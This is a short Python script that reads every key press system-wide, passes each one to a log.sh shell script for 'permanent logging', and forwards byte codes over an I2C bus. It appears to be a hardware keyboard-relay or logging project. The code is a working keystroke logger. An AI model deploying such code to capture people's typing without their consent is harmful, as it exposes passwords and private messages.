import os
import keyboard
import subprocess
from smbus import SMBus

addr = 0x20 # bus address
bus = SMBus(1) # indicates /dev/ic2-1
pathtologSH=f"{os.getcwd()}/log.sh"

# ASCII codes for modifier keys
modifiers={
    "enter"     : (13,  None),
    "space"     : (32,  " "),
    "alt gr"    : (1,   None),
    "alt"       : (2,   None),
    "ctrl"      : (128, None),
    "shift"     : (15,  None),
    "backspace" : (8,   None),
    "delete"    : (127, None),
    "left"      : (17,  None),
    "right"     : (18,  None),
    "up"        : (19,  None),
    "down"      : (20,  None),
    "caps lock" : (178, None)
}

# function that converts pressed letters to sendable ASCII values
def ConvertStringToBytes(src):
     converted = []
     for i in f"{src}":
         converted.append(ord(i))
     return converted

# start of permanent logging
while True:
    event = keyboard.read_event()
    name=event.name
    # only record if event is a press down
    if event.event_type == keyboard.KEY_DOWN:
        if name == "space":
             subprocess.run(["/bin/sh", pathtologSH, " "])
        elif name == "y":
            subprocess.run(["/bin/sh", pathtologSH, "z"])
        elif name == "z":
            subprocess.run(["/bin/sh", pathtologSH, "y"])
        elif len(name) > 1:
            subprocess.run(["/bin/sh", pathtologSH, name.upper()])
        else:
            subprocess.run(["/bin/sh", pathtologSH, name])
       # this is to send certain bytes for the modifier keys
        if len(name)>1:
            bus.write_byte(addr, modifiers[name][0])

        # if the key isnt a modifier key than e.g. normal letters
        # it converts the text to bytes and sends it
        else:
            for i in ConvertStringToBytes(event.name):
                bus.write_byte(addr, i)
